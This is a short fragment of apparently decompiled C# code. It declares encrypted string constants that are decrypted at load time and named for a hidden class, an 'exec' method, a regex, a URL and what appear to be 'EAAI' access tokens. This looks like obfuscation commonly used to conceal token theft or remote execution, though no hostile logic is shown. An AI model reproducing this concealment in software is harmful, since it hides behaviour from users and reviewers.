...
{
	private static string CLAZZ_NAME_SE = "HBFISkabrsXHYpzFAGIb7A==.WXfXUgnIDXwaXdz+mJrQpewaLpJ3Emc8Uvxbp8jpjys=";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private static string METHOD_EXEC_SE = "US+W5bvOqIUrYCFrNYA2ww==.yhO7onsokUdig9BLRLpgHCSqgYcJWb0aNiX3SS55Kno=";

	private static string METHOD_EXEC = SecurityUtils.ReadStructEncrypted(METHOD_EXEC_SE);

	private static string GET_EAAI_SE = "sfOymsLyUSfcBMtNESmpTQ==.B+V+p8+vsrpO0u7xmduCpeVL/R2vMfZKUxrvvTS9lBQ=";

	private static string GET_EAAI = SecurityUtils.ReadStructEncrypted(GET_EAAI_SE);

	private static string REGEX_01_SE = "QfR2e1eUgWDKMs3Bax7tPA==.UfCts3nsVnoxY2PlLrrEWcbv4TVJXu3umZ2taVO1ZA4=";

	private static string REGEX_01 = SecurityUtils.ReadStructEncrypted(REGEX_01_SE);

	private static string LOG_01_SE = "uaIk9FTPioo/NUCgUXPijw==.yPB0hCoD2r5PSi6NCQr3CEwSC4WDoIrMdfGhGB/wmPUHV18J56Mjk0w86dppf2SW";

	private static string LOG_01 = SecurityUtils.ReadStructEncrypted(LOG_01_SE);

	private static string EAAI_SE = "DDHYMiGJq/NIyg+7XHgKgg==.qT3w2nFrdqqERr53GITBdidvaS4AxhHR5ReoVT8lmFk=";

	private static string EAAI = SecurityUtils.ReadStructEncrypted(EAAI_SE);

	private static readonly string URL_1_SE = "UHiIqU1f1S6/cOD+OQ/3pg==.jllj1CfOqOZFpNTItrcuh/rrEWnPL6GBaKd0ka7tWWx1kSura2WPhFQ3pFmjcmknmksL2hp2TZHTzxHDc0YWSoCgcdxfkAeDPTR+qZSHVSY=";
